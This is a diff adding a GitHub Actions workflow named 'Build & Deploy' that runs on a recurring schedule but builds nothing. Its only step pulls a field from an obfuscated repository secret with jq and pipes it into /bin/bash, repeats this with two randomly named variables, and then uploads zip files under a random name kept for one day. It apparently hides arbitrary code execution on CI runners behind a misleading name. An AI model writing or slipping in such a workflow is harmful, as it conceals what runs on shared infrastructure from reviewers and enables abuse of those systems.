@@ -1,0 +1,29 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          urdt6: ${{ secrets.urdt6 }}
+        run: |
+          printf '%s' "$urdt6" | jq -r .e4950 | /bin/bash
+          echo $nsu447 | jq -r .jfkoh1 | /bin/bash
+          echo $hvg5464 | jq -r .eyxq17 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: pSF5lrQH
+          path: "*.zip"
+          retention-days: 1
